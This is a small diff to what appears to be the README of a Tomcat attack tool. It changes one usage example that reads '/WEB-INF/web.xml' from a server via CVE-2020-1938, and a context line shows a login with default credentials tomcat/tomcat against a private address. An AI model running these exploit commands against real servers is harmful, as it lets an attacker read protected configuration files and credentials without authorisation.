@@ -73,7 +73,7 @@ $ python tomcat.py list -u tomcat -p tomcat 172.17.0.2
 
 * Reading file using CVE-2020-1938
 ```
-$ python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 172.17.0.2
+$ python tomcat.py read_file --webapp=examples /WEB-INF/web.xml 172.17.0.2
 ```
 
 
